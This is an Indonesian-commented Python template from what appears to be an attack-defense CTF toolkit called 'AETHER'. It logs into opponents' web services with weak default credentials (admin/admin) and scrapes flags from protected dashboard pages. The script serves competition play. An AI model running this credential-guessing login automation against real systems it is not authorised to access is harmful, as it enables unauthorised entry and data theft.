"""TEMPLATE: web yang butuh LOGIN dulu, baru flag kebaca di halaman terproteksi.

KAPAN DIPAKAI: service web di mana flag ada di balik login (dashboard/profil/admin),
dan kredensialnya lemah/dikasih panitia.

CARA PAKAI (TANPA NGODING — ganti baris bertanda `# GANTI INI`):
1. Aktifkan:  cp scripts/custom/example_http_login.py scripts/custom/serang_login.py
2. Ganti URL login, URL halaman-flag, dan user/pass.
3. Selesai. AETHER jalanin otomatis; flag auto-masuk inbox.
"""

from __future__ import annotations

import httpx

# ── GANTI INI ─────────────────────────────────────────────────────────────────
LOGIN_PATH = "/login"              # path form login
FLAG_PATH = "/dashboard"           # path halaman tempat flag muncul setelah login
USER_FIELD, PASS_FIELD = "username", "password"   # nama field di form
USERNAME, PASSWORD = "admin", "admin"             # kredensial yang dicoba
# ────────────────────────────────────────────────────────────────────────────


async def check_target(host: str, port: int, flag_ids: list[str], client: httpx.AsyncClient) -> list[str]:
    base = f"http://{host}:{port}"
    outputs: list[str] = []
    try:
        # 1) login (cookie sesi otomatis disimpan oleh client)
        await client.post(f"{base}{LOGIN_PATH}", data={USER_FIELD: USERNAME, PASS_FIELD: PASSWORD})
        # 2) buka halaman terproteksi
        resp = await client.get(f"{base}{FLAG_PATH}")
        outputs.append(resp.text)
        # 3) kalau ada flag_id per tick, buka halaman per-id juga
        for fid in (flag_ids or []):
            r = await client.get(f"{base}{FLAG_PATH}", params={"id": fid})
            outputs.append(r.text)
    except Exception as exc:  # noqa: BLE001
        outputs.append(f"(error: {exc})")
    return outputs
